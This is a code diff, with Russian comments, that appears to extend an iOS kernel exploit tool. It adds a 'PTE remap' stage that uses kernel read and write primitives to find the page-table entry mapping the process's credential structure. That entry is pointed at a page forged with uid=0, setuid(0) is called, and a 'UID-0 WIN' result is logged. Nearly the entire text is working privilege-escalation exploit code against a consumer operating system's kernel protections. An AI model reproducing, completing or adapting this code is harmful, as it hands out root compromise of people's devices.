@@ -2874,6 +2874,89 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             }
         }
         kpNote(r, [NSString stringWithFormat:@"  [SPTM] frames type15=%u type21-pte-like=%u", n15, n21pte]);
+
+        // ---- PTE REMAP 2.0.73: ucred VA → наша страница с uid=0 ----
+        // 39 кадров 0x21 выглядят как PTE. Ищем leaf-PTE, который мапит
+        // страницу ucred, подменяем OA на sacrificial 0x21-страницу.
+        if (n21pte > 0 && curUcred) {
+            uint64_t ucPage = curUcred & ~0x3fffULL;
+            uint64_t ucPA = kvtophys(ucPage);
+            uint64_t uoff = curUcred & 0x3fff;
+            kpNote(r, [NSString stringWithFormat:@"  [PTE] ucredPage=%#llx PA=%#llx uoff=%#llx",
+                      (unsigned long long)ucPage, (unsigned long long)ucPA, (unsigned long long)uoff]);
+            if (ucPA) {
+                // sacrificial страница: 0x21, заполняем uid=0 в слоте uoff
+                uint64_t sacPA = 0, sacVA = 0;
+                for (uint64_t pa = wB; pa < wB + wS; pa += 0x4000) {
+                    if (kpFrameTypeOf(pa) != 0x21) continue;
+                    uint64_t al = phystokv(pa);
+                    if (!al) continue;
+                    if (al == ucPage) continue;
+                    // ищем страницу, которая НЕ выглядит как PTE и НЕ содержит 501
+                    int looksPte = 0, has501 = 0;
+                    for (uint32_t o = 0; o < 0x100; o += 8) {
+                        uint64_t q = early_kread64(al + o);
+                        if ((q & 3) == 3) looksPte++;
+                        if (q == 0x000001f5000001f5ULL) has501 = 1;
+                    }
+                    if (looksPte >= 8 || has501) continue;
+                    sacPA = pa; sacVA = al; break;
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [PTE] sac page PA=%#llx VA=%#llx",
+                          (unsigned long long)sacPA, (unsigned long long)sacVA]);
+                if (sacPA && sacVA) {
+                    // пишем uid=0 в слот uoff на sacrificial
+                    uint64_t slotVA = sacVA + uoff;
+                    uint64_t slotSave = early_kread64(slotVA);
+                    early_kwrite64(slotVA, 0);
+                    // ищем PTE, мапящий ucPA, на 0x21-страницах
+                    uint64_t pteVA = 0, pteSave = 0;
+                    for (uint64_t pa = wB; pa < wB + wS && !pteVA; pa += 0x4000) {
+                        if (kpFrameTypeOf(pa) != 0x21) continue;
+                        uint64_t al = phystokv(pa);
+                        if (!al) continue;
+                        for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
+                            uint64_t q = early_kread64(al + o);
+                            if ((q & 3) != 3) continue;
+                            uint64_t oa = q & 0x0000ffffffffc000ULL;
+                            if (oa == (ucPA & ~0x3fffULL)) {
+                                pteVA = al + o;
+                                pteSave = q;
+                                kpNote(r, [NSString stringWithFormat:@"  [PTE] ★ leaf-PTE at %#llx = %#018llx (oa=%#llx)",
+                                          (unsigned long long)pteVA, (unsigned long long)q, (unsigned long long)oa]);
+                                break;
+                            }
+                        }
+                    }
+                    if (pteVA) {
+                        // подменяем OA на sacPA, сохраняем флаги
+                        uint64_t newPte = (pteSave & ~0x0000ffffffffc000ULL) | (sacPA & 0x0000ffffffffc000ULL);
+                        early_kwrite64(pteVA, newPte);
+                        uint64_t rbP = early_kread64(pteVA);
+                        // TLB flush: пробуем через sysctl / просто syscall
+                        // arm64: вызов getpid() несколько раз + sched_yield
+                        for (int i = 0; i < 8; i++) { getpid(); sched_yield(); }
+                        uid_t u1 = getuid();
+                        int su = setuid(0);
+                        uid_t u2 = getuid();
+                        kpNote(r, [NSString stringWithFormat:@"  [PTE] remap readback=%#018llx uid %u→%u setuid=%d (sac slot=%#llx)",
+                                  (unsigned long long)rbP, u1, u2, su, (unsigned long long)slotVA]);
+                        if (u2 == 0) {
+                            kpNote(r, @"=== UID-0 WIN ★★★ (PTE remap) ===");
+                        } else {
+                            // restore PTE + slot
+                            early_kwrite64(pteVA, pteSave);
+                            early_kwrite64(slotVA, slotSave);
+                            for (int i = 0; i < 8; i++) { getpid(); sched_yield(); }
+                            kpNote(r, @"  [PTE] remap restored — TLB не обновился или PTE не тот");
+                        }
+                    } else {
+                        early_kwrite64(slotVA, slotSave);
+                        kpNote(r, @"  [PTE] leaf-PTE для ucred не найден на 0x21-страницах");
+                    }
+                }
+            }
+        }
     }
 
     [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM] выше\n"];
